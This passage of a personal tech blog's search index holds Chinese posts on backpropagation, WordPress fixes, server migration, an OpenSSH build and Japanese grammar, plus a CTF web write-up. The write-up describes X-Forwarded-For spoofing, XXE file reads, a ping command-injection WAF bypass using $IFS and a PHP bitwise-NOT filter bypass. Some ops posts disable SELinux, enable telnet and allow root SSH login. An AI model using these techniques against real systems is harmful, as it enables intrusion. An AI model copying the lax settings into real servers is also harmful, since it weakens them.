其实还挺容易理解的：$ O_{j}(1-O_{j}) $ 表示 sigmod函数的偏导，即表示调整误差的速度即 j 层神经元误差是通过预期输出与实际输出的差值和调整误差速度来获取的 激动人心的时候到啦!! 式子 (1)为: $ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} $ 式子 (6)为: $ \\Delta \\omega_{ij} = \\eta\\frac{\\partial E}{\\partial w_{hj}} $ 式子 (7)为: $ \\frac{\\partial E}{\\partial w_{hj}} =\\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}}\\cdot\\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} $ 式子 (8) 和 (10) 分别为: $ \\frac{\\partial z_{j}^{l}}{\\partial w_{hj}} = a_{hj}^{l-1} = O_{i} \\qquad $ $ \\frac{\\partial E}{\\partial a_{j}^{l}}\\cdot \\frac{\\partial a_{j}^{l}}{\\partial z_{j}^{l}} = a_{j}^{l}\\cdot (1-a_{j}^{l})\\cdot (Y_{j}^{k}-a_{j}^{l}) = E_{j} $ 即: $ \\Delta \\omega_{ij} = (\\eta)O_{i}E_{j} $ 类似也可以证得偏置量公式 $ b_{j} = -(\\eta)E_{j} $心累,,,不过推导完后，感觉还挺好玩的，23333 参考链接：csdn: zhiyong_willgithub: edvardHuacsdn: csdn人工智能头条","categories":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/categories/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}],"tags":[{"name":"学校课程","slug":"学校课程","permalink":"https://tari.moe/tags/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/"}]},{"title":"wordpress 常见问题汇总","slug":"wordpress_problem","date":"2019-09-23T08:21:21.000Z","updated":"2021-04-02T02:26:29.144Z","comments":true,"path":"2019/09/23/wordpress_problem/","link":"","permalink":"https://tari.moe/2019/09/23/wordpress_problem/","excerpt":"","text":"wordpress升级后后台访问不了Cannot Modify Header Information – Headers Already Sent By……. 解决办法一：在主题目录下functions.php开头加入ob_start()； 解决办法二：找到sent by后面的.php文件，保存为UTF-8无BOM编码格式; vim 的话，命令模式输入 :set nobomb 即可转换为UTF-8无BOM编码格式 wordpress 后台媒体库不显示以及上传错误在&lt;!DOCTYPE&gt; 声明之前有其他的代码导致浏览器不能正确识别页面的标准，所以才造成了某些基于html5的特性不能使用。 参考链接 https://www.zmki.cn/1428.html","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"运维/Wordpress","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Wordpress/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"2019年第三届广东省强网杯网络安全大赛WEBwriteup","slug":"2019qwb","date":"2019-09-10T12:08:00.000Z","updated":"2021-04-04T05:09:44.702Z","comments":true,"path":"2019/09/10/2019qwb/","link":"","permalink":"https://tari.moe/2019/09/10/2019qwb/","excerpt":"","text":"八卦本次比赛的一个槽点，为什么是在星期一二举行咧… 由于我只会一点 web ，所以只解出几道 web 题 Writeby TARITARI 1. Web – 小明又被拒绝了看到题目很容易想到改http头，于是抓包。一开始直接改cookie: admin=1无效，后来想了下，小明如果是本地人就不会被拒绝啦！于是用到X-Forwarded-For字段，伪造ip为本地地址127.0.0.1。提交过去发现不是admin，改好cookie后即可获得flag{xxasdasdd_for} 2. Web – XX？看到题目就想到了xxe，先访问网站发现网站的标题为gedit 然后网上搜了下发现gedit在写完文件后，默认会产生一个以~结尾的备份文件名例如：index.php~。这可用于从服务器中提取源代码/文件。然后御剑扫描发现有三个文件，于是访问index.php~得到源码。哦豁，果然是xxe。 我有一个大胆的想法，flag.php会不会也有呢？好吧，没有。那我们继续外部实体注入攻击，结合扫描出来的flag.php，得到base64编码。解码可得flag{IUyasd8213123123890} 3. 免费的,ping一下~结合题目和页面，是php ping命令执行无误了，ls一下，果然是这样。然后尝试ls一下根目录，发现waf过滤敏感字符了。于是测试被过滤掉的是空格还是“/“斜杠。结合网上搜一下，得知中有个变量叫IFS(Internal Field Seprator) ,内部域分隔符，即空格。代替原来的成功执行了。继续ls得知原来是空格被waf过滤掉了。嘿嘿，那就是可以cat /flag啦，执行以下，然后得知cat 或flag关键字又被过滤了。由于我偶尔会编写shell脚本，想到用变量拼接可以绕过关键字的过滤。然后一顿猛如虎的操作，结果被告知flag不在第一行。而且他只能显示部分内容。。。最后使用tail -n 1 /flag 成功获取flag{llllll_U_GeT_Th3_fl4g} 4. php访问页面得到一个apache的欢迎页面，于是直接用御剑扫，得到三个文件访问index.php得知本题为条件绕过型题目。第一眼看过去整个人傻了，无数字字母还好说，可以用异或^，左右移等等去绕过。然后发现取反和自增可以绕过，但是长度只有27，太苛刻了。于是想到，如果这个是php7，那么就可以利用php7的新特性，即可以通过($function)();的方式动态执行函数。https://www.php.net/manual/zh/migration70.incompatible.php取反~符号可以把字母数字符号等等变为不可见字符，就可以轻松绕过正则了，为了被成功解析，使用urlencode一下。 先copy下来，本地测试，注释掉错误回显，方便调试。先试试phpinfo测试一下，通过 echo urlencode(~”phpinfo”)构造一下。 加上(~exp)(); 试试，就发现可以在题目环境中成功执行，接下来就简单了。 构造 GetYourFlag调用GetYouFlag()OK，接下来最后发现flag{3904c5df2e894ca02a21004feb21e617} 在源码中。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"wordpress后台登录密码前端js加密+php后端解密","slug":"wordpress后台登录加密","date":"2019-08-26T13:03:23.000Z","updated":"2021-04-02T02:26:16.154Z","comments":true,"path":"2019/08/26/wordpress后台登录加密/","link":"","permalink":"https://tari.moe/2019/08/26/wordpress%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%8A%A0%E5%AF%86/","excerpt":"","text":"由于特殊原因，wordpress后台登录密码不能被明文抓包…于是我采用 rsa 前端 js 加密 + php 后端解密 的方式进行 那只能大费周章去改wordpress代码了= = 。。。。 由于 wordpress 登录时 wp-login.php 是直接提交表单给自己的于是想到用 jquery 去修改表单数据， 直接上代码。 wordpress根目录 wp-login.php 文件此处需要用到两个库文件 jQuery 和 jsencrypt在表单代码后面的 js 处 添加 123456789101112131415161718&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jquery/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;./wp-includes/js/jsencrypt.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; /* * writeBy：TARI * date: 2019/08/26 * usage: $(&quot;#user_pass&quot;).change方法对密码进行 rsa 公钥加密传输 */ $(&quot;#user_pass&quot;).change(function()&#123;//失去焦点触发，就是点击登陆按钮后触发 // 数据处理 var pubkey = &#x27;你的公钥&#x27; var encrypt = new JSEncrypt(); encrypt.setPublicKey(pubkey); var encrypted = encrypt.encrypt($(&#x27;#user_pass&#x27;).val()) $(&quot;#user_pass&quot;).val(encrypted); //重新赋值 &#125;);&lt;!-- 下面还有wp_attempt_focus()等函数， 或者新建一对 js 标签也行，不过我没测试过 --&gt;&lt;/script&gt; wordpress根目录/wp-includes/pluggable.php 文件12345678910111213141516function wp_authenticate($username, $password) &#123; $username = sanitize_user($username); $password = trim($password); // 这里后添加如下代码： // 私钥不能因为好看而添加乱七八糟的缩减之类的 $private_key = &quot;私钥内容&quot;; $decrypt_data = &#x27;&#x27;; // 判断私钥是否是可用的，可用返回资源id $pi_key = openssl_pkey_get_private($private_key); // 解密数据, 这里要进行 base64 解码是因为浏览器会默认帮你的数据进行编码 openssl_private_decrypt(base64_decode($password), $decrypt_data, $private_key); $password = $decrypt_data; //下面一堆代码 balabala&#125; 再抓包密码就是加密状态啦！在 wordpress 找密码验证的函数和文件找了挺久的….","categories":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"开发/Wordpress","permalink":"https://tari.moe/categories/%E5%BC%80%E5%8F%91/Wordpress/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://tari.moe/tags/%E5%BC%80%E5%8F%91/"},{"name":"Wordpress","slug":"Wordpress","permalink":"https://tari.moe/tags/Wordpress/"}]},{"title":"nginx双冗余及负载均衡搭建","slug":"Redundancy and load balancing","date":"2019-07-28T07:03:22.000Z","updated":"2021-04-02T02:27:38.112Z","comments":true,"path":"2019/07/28/Redundancy and load balancing/","link":"","permalink":"https://tari.moe/2019/07/28/Redundancy%20and%20load%20balancing/","excerpt":"","text":"nginx 双冗余nginx 冗余安装脚本链接配置文件的 链接在此 **注意事项** /etc/selinux/configSELINUX=off 感觉线上和线下一个比较大的区别就在防火墙，线下可以的在被这个卡了半天 123# eth0 该字段根据网卡类型来定义firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload 这个ip转发用不用就忘了测试了，如果开启防火墙还不行就试试吧。echo “net.ipv4.ip_forward = 1” &gt;&gt; /etc/sysctl.conf 如果没装 zlib zlib-devel openssl 的记得安装喔！ *** WARNING - this build will not support IPVS with IPv6. Please install libnl/libnl-3 dev libraries to support IPv6 with IPVS. 1yum -y install libnl libnl-devel nginx 负载均衡nginx 配置文件内 upstream yourname &#123; yourip; &#125; location / &#123; proxy_pass http://yourname; &#125;","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"运维/Nginx","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/Nginx/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://tari.moe/tags/Nginx/"}]},{"title":"「量詞」","slug":"「量詞」","date":"2019-07-23T11:33:28.000Z","updated":"2021-04-02T02:13:19.068Z","comments":true,"path":"2019/07/23/「量詞」/","link":"","permalink":"https://tari.moe/2019/07/23/%E3%80%8C%E9%87%8F%E8%A9%9E%E3%80%8D/","excerpt":"","text":"- –&gt; –&gt; - １ いち か さ た は 行 いっ 枚、回、台、歳 ６ ろく か さ た は 行 ろっ 枚、回、台、歳 ８ はち か は 行 はっ 枚、回、台、歳 １０ じゅう か さ た は 行 じゅっ 枚、回、台、歳 例：リンゴを三つ買いました&emsp;&emsp;写真を3枚撮りました&emsp;&emsp;蜜柑を８つ食べました 昨日は4時間しか寝ませんでしたしか + ませんでした 要翻訳成肯定 [量詞] + も 強調 [重 厚 長 大 多]ケーキを8個も食べました [量詞] + しか 強調 [軽 薄 短 小 少]財布に１０元しかありません [量詞] だけ zhiyou~ 10分だけ休みましょう [量詞] ぐらい ~左右 財布に１０元ぐ(く)らいあります [量詞] は zhishao~ 財布に１０００元はあります","categories":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"勉強","slug":"勉強","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"Web站群从Ubuntu14.04迁移至CentOS7","slug":"ansible-shell","date":"2019-07-15T04:47:50.000Z","updated":"2021-04-02T02:15:12.004Z","comments":true,"path":"2019/07/15/ansible-shell/","link":"","permalink":"https://tari.moe/2019/07/15/ansible-shell/","excerpt":"","text":"nfs迁移 系统环境: CentOS-7-x86_64-Minimal-1511相关的剧本和脚本可以 参考我的github common.sh 为公用脚本，包含公用模块 服务器备份1ansible-playbook srvs_backup_role.yml 出现问题: failed: [192.168.206.132] (item=baseVersionBackup.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;fe2fab79a66b8f5489418fd7b556cdbb74abcac6&quot;, &quot;item&quot;: &quot;baseVersionBackup.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; 这个问题主要是由 SELinux（Security-Enhanced Linux）引起的. CentOS7 一般自带 libselinux-python 12# 没有的话可以安装一下yum -y install libselinux-python 由于我不大了解它, 干脆就把它的禁用了, 记得在目标主机禁用喔.. 123sed -i &#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config &amp;&amp;sed -i &#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27; /etc/selinux/config 更新源为阿里云源这个过程可能要下载的东西较多，有些主机可能写到大半就连接超时了。对于少许主机可以直连上去执行 yum update 1ansible-playbook yum_aliyun_source_role.yml openssh 安装启用 telnet 以防万一12ansible webGroup -m shell -a &#x27;yum -y install xinetd telnet-server&#x27;ansible webGroup -m shell -a &#x27;ls -ll /etc/xinetd.d/telnet&#x27; 添加用户以防万一1234567---- hosts: webGroup remote_user: root tasks: - name: create username user user: name=username password=yourpassword 123456789---- hosts: &#123;&#123; runHost &#125;&#125; remote_user: root tasks: - name: create username group group: name=username state=absent - name: create username user user: name=username state=absent 关闭防火墙，让外边的 telnet 请求可以进来 1firewall-cmd --add-service=telnet --permanent 或者 1234iptables -I INPUT -p tcp --dport 23 -jACCEPTiptables -I INPUT -p udp --dport 23 -jACCEPTservice iptables saveservice iptables restart 准备工作完成，开始安装 OpenSSH1ansible-playbook openssh_role.yml 确认是否升级成功 1ansible webGroup -m shell -a &quot;ssh -V&quot; 重启一下主机，等待少许时间并检测 sshd 的状态， 123ansible webGroup -m shell -a &quot;reboot&quot;ansible webGroup -m shell -a &quot;systemctl status sshd&quot; 对于有问题的少许主机可以直连上去执行 systemctl stop sshd 并等待少许执行systemctl start sshd 开启防火墙，阻止外边的 telnet 请求进来 1firewall-cmd --remove-service=telnet 或者 1iptables -A INPUT -p tcp --dport 23 -jDROP 对相应的服务器安装 nginx 1.16.01ansible-playbook nginx_role.yml nginx的配置根据旧服务器的来就好了. nginx 双冗余nginx 存活探测脚本链接配置文件的 链接在此//注意事项// 脚本要用到 killall 命令, 没有的同学记得装, centos killall的包是，不过我的脚本会默认帮你装上。 1yum -y install psmisc 防火墙的的网卡 eth0 记得跟根据自己的网卡来 12firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload nginx 负载均衡这个比较容易, 需要注意的是如果用到 session 记得用 哈希法 即添加 ip_hash; 到 upsteam 中就好啦 对相应的服务器安装 PHP7.21ansible-playbook php_role.yml 根据网上资料推荐使用 sock 而且不是 端口cgi 模式php旧服务器的配置更换了 /etc/php.ini 和 /etc/php-fpm.d/www.conf 文件到新服务中 对相应的服务器安装 mysql5.71ansible-playbook mysql_role.yml 安装完后记得对导入的数据授权喔！！！不然远程连接会被禁止掉的。 为了方便知道自己操控哪个服务器在 /etc/bashrc 或 ~/.bashrc 文件最后添加 1export PS1=&quot;[\\u@`hostname -I | cut -d &quot;.&quot; -f 4`\\W]# &quot; 然后 source 一下 调整时间、时区由于我的时间和北京时间是一样的, 所以我就省略这步啦! nfs 服务器的迁移common.sh 和 nfs.sh 脚本位置首先配置要使用 nfs 服务的服务器路径 # /etc/exports 文件 /home/www/某个站点 ip地址(rw,sync,all_squash,no_subtree_check) /home/www/某个站点 IP地址(rw,sync,all_squash,no_subtree_check) /home 路径是下图 mounted on 下的路径 参数说明: rw 读写权限 sync 数据同步写入内存缓冲区和硬盘, 保证数据一致 all_squash 所有访问用户都映射为匿名用户或用户组 no_subtree_check 即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限 把文件传送到目标服务器balabala～ 1systemctl reload nfs 允许相应服务的防火墙 1234firewall-cmd --add-service=nfs --permanent --zone=publicfirewall-cmd --add-service=mountd --permanent --zone=publicfirewall-cmd --add-service=rpc-bind --permanent --zone=publicfirewall-cmd --reload 创建相应文件的软连接方便nfs上nginx的使用在web服务器上创建要挂载的文件夹并挂载 临时挂载 1mount -t nfs nfs的IP地址:路径 本机路径 /etc/fstab 文件添加以用于开机启动 nfs的ip地址:路径 本机路径 nfs rw 0 0 nfs的ip地址:路径 本机路径 nfs rw 0 0 需要主要，两台不同服务器的用户的gid和uid一不一致，不然会出现旧服务器无法写入的现象 rsync 增量备份小前言: 权限明明够，但是一直报这个错： rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13) 后来发现 selinux 没关闭。。。。。。。。。。。。 首先开放端口吧！如果用的是 iptables 1vi etc/sysconfig/iptables 添加 -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT 或者直接 1iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT 然后再重启一下就行了 1systemctl restart iptables 或 1iptables-save 如果用的是 firewalld 123firewall-cmd --add-port=873/tcp --permanent &amp;&amp;firewall-cmd --reload &amp;&amp;firewall-cmd --list-port 我搭建的 rsync 是这样子的，主服务器 (也就是正在运行Web服务器的服务器) 文件发生改变 (内容改变或者文件本身的增加或者删除) 就会通过监听脚本自动备份到备份服务器 以下安装和配置 rsync 是参考该链接 站长那些事儿 两台服务器一起安装 rsync1yum install rsync xinetd -y 还要增加一个配置文件 (这个配置文件在CentOS7下不存在，我们手动创建) 1vi /etc/xinetd.d/rsync 内容如下 # default: off # description: The rsync server is a good addition to an ftp server, as it \\ # allows crc checksumming etc. service rsync &#123; disable = no flags = IPv6 socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID &#125; 是 从这里 找滴，亲测可用 接下来是 负责备份的服务器 的事情了1vi /etc/rsyncd.conf 添加以下内容 log file = /var/log/rsyncd.log pidfile = /var/run/rsyncd.pid lock file = /var/run/rsync.lock secrets file = /etc/rsync.pass motd file = /etc/rsyncd.Motd #模块名称 [test] #你想备份在本服务器哪个路径就填呗 path = /home/test #描述随便加 comment = just a test uid = 0 gid = 0 port = 873 use chroot = no read only = no list = no max connections = 200 timeout = 600 #认证用户名，可以随便取 auth users = test_user #主服务器IP地址 hosts allow = 你的ip地址 认证用户和密码文件，系统原本没有，需要我们手动创建的喔。该文件名字可以随意 1vi /etc/rsync.pass 里面是内容是 键值对 test_user:testpass 这里注意啦，必须是权限必须是 600 喔 123chmod 600 /etc/rsyncd.conf &amp;&amp;chmod 600 /etc/rsync.pass &amp;&amp;service xinetd restart 启动 rsync 有些需要有些不需要， 可能是防火墙原因阻拦了其他端口… 1rsync --daemon --config&#x3D;&#x2F;etc&#x2F;rsyncd.conf --port&#x3D;873 接下来到 主服务器 的事情了首先创建密码文件，文件名字也是可以随意喔！ 1vi /etc/passwd.rsync 内容注意啦 testpass 是 刚刚备份服务器 /etc/rsync.pass 目录下认证用户的密码喔，只需填上面红字的内容就OK啦 这里权限也要注意，必须是 600 喔 12chmod 600 /etc/passwd.rsync &amp;&amp;service xinetd restart 先安装预编译所需要的工具 1yum install make gcc gcc-c++ -y 然后下载和安装inotify-tools 123456cd /usr/local/src &amp;&amp;wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;cd inotify-tools-3.14 &amp;&amp;./configure --prefix=/usr/local/inotify &amp;&amp;make &amp;&amp; make install 配置环境变量 1234echo &quot;PATH=/usr/local/inotify/bin:$PATH&quot; &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;source /etc/profile.d/inotify.sh &amp;&amp;echo &quot;/usr/local/inotify/lib&quot; &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;ln -s /usr/local/inotify/include /usr/include/inotify 配置参数 1vi /etc/sysctl.conf 注释后面添加 fs.inotify.max_queued_events=99999999 fs.inotify.max_user_watches=99999999 fs.inotify.max_user_instances=65535 创建排除目录列表 1vi /usr/local/inotify/exclude.list 创建一个排除目录，这里可以添加不同步的目录，一行一个目录。如果暂时没有可以留空，以后需要用到在添加。 如果 uploads 目录是挂载目录可以排除掉 wp-content/uploads/ 增量备份脚本 1vi /usr/local/inotify/rsync.sh 123456789101112131415161718192021222324#!/bin/sh#主服务器需要备份的目录srcdir=/home/test#模块名称dstdir=testexcludedir=/usr/local/inotify/exclude.list#认证名称rsyncuser=test_user#本机存密码的目录rsyncpassdir=/etc/passwd.rsync#备份服务器的IP地址dstip=&quot;备份服务器滴IP地址&quot;for ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirdone/usr/local/inotify/bin/inotifywait -mrq --timefmt &#x27;%d/%m/%y %H:%M&#x27; --format &#x27;%T %w%f%e&#x27; -e close_write,modify,delete,create,attrib,move $srcdir | while read filedofor ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirecho &quot; $&#123;file&#125; was rsynced&quot; &gt;&gt; /tmp/rsync.log 2&gt;&amp;1donedone 脚本可执行权限 1chmod +x /usr/local/inotify/rsync.sh 添加开机启动 1vi /etc/rc.d/rc.local 开机启动文件中最后一行添加 sh /usr/local/inotify/rsync.sh &amp; 通过互换 ip 迁移服务器Centos重启网络配置文件会导致 /etc/resolv.conf 被覆盖或清空 进而导致 yum 无法使用","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"运维/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"Install_OpenSSH8.0p1_from_source","slug":"Install-OpenSSH8-0p1-from-source","date":"2019-07-14T08:04:44.000Z","updated":"2021-04-02T02:16:28.048Z","comments":true,"path":"2019/07/14/Install-OpenSSH8-0p1-from-source/","link":"","permalink":"https://tari.moe/2019/07/14/Install-OpenSSH8-0p1-from-source/","excerpt":"","text":"系统环境: CentOS-7-x86_64-Minimal-1511root用户+备份+下载包+校验包 一气呵成Package Information (包的相关信息) Download (HTTP): https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz Download MD5 sum: bf050f002fe510e1daecd39044e1122d Download size: 1.5 MB Estimated disk space required: 45 MB (add 12 MB for tests) Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed) 虽然没出过事, 但还是要留条退路安装 telnet 12yum -y install telnet-server.x86_64 &amp;&amp;yum -y install telnet.x86_64 安装 xinetd (提供访问和日志管理等功能) 1yum -y install xinetd.x86_64 开启服务 &amp;&amp; 开机启动 12345systemctl start xinetd &amp;&amp;systemctl start telnet.socket &amp;&amp;systemctl enable telnet.socket &amp;&amp;systemctl enable xinetd.service 预编译如果直接上可能出现以下 4 个问题: 一checking for cc... no checking for gcc... no configure: error: in \\`/root/openssh-8.0p1&#39;: configure: error: no acceptable C compiler found in $PATH See \\`config.log&#39; for more details 缺少 cc 和 gcc 编译器, 解决方法: 1yum -y install cc gcc 二checking for zlib.h... no configure: error: *** zlib.h missing - please install first or check config.log *** 缺少 zlib-devel 环境, 解决方法: 1yum -y install zlib-devel 三configure: error: *** working libcrypto not found, check config.log libcrypto 有点眼熟…解决方法: 1yum install openssl-devel 四configure: error: PAM headers not found 缺少pam-devel环境, 解决方法: 1yum install pam-devel 设置适当的环境以用于其他安装步骤： 123456789install -v -m700 -d /var/lib/sshd &amp;&amp;chown -v root:sys /var/lib/sshd &amp;&amp;groupadd -g 50 sshd &amp;&amp;useradd -c &#x27;sshd PrivSep&#x27; \\ -d /var/lib/sshd \\ -g sshd \\ -s /bin/false \\ -u 50 sshd 安装官网的编译应该木得问题了 12345./configure --prefix=/usr \\ --sysconfdir=/etc/ssh \\ --with-md5-passwords \\ --with-pam \\ --with-privsep-path=/var/lib/sshd 编译并测试下make &amp;&amp; make test 安装12345678make install &amp;&amp;install -v -m755 contrib/ssh-copy-id /usr/bin &amp;&amp;install -v -m644 contrib/ssh-copy-id.1 \\ /usr/share/man/man1 &amp;&amp;install -v -m755 -d /usr/share/doc/openssh-8.0p1 &amp;&amp;install -v -m644 INSTALL LICENCE OVERVIEW README* \\ /usr/share/doc/openssh-8.0p1 遇到的两个错误信息一/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication /etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials 注释掉这两行就好啦, 解决方法: 12345sed -i &#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27; /etc/ssh/sshd_config 二@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_rsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ecdsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ed25519_key sshd: no hostkeys available -- exiting. make: [check-config] Error 1 (ignored) 上面三个文件的权限问题, 解决方法: 123chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ed25519_key 修改配置文件,允许root登录12sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config sshd 开机启动1systemctl enable sshd 还有别忘了关闭 telnet 喔! 12systemctl stop xinetd &amp;&amp;systemctl stop telnet.socket &amp;&amp; ———————————————————— END ————————————————————","categories":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7_backup","slug":"CentOS7-backup","date":"2019-07-13T04:20:32.000Z","updated":"2021-04-02T02:15:24.392Z","comments":true,"path":"2019/07/13/CentOS7-backup/","link":"","permalink":"https://tari.moe/2019/07/13/CentOS7-backup/","excerpt":"","text":"参考链接: 左客 rsync增量备份 tar 备份失败一个小坑:我在执行下面命令的时候, 如果我不是在根目录, 会导致备份失败, 不是很懂为什么. 1time tar cvpjf $&#123;BZ2BACKUP&#125; --exclude=/proc --exclude=/lost+found --exclude=/$&#123;BZ2BACKUP&#125; --exclude=/mnt --exclude=/sys --exclude=/media / rsync 三种工作方式 本地文件系统上实现同步。命令行语法格式为上述”Local”段的格式。 本地主机使用远程shell和远程主机通信。命令行语法格式为上述”Access via remote shell”段的格式。 本地主机通过网络套接字连接远程主机上的rsync daemon。命令行语法格式为上述”Access via rsync daemon”段的格式。 相关参数说明: -v：显示rsync过程中详细信息。可以使用\"-vvvv\"获取更详细信息。 -P：显示文件传输的进度信息。(实际上\"-P\"=\"--partial --progress\"，其中的\"--progress\"才是显示进度信息的)。 -n --dry-run ：仅测试传输，而不实际传输。常和\"-vvvv\"配合使用来查看rsync是如何工作的。 -a --archive ：归档模式，表示递归传输并保持文件属性。等同于\"-rtopgDl\"。 -r 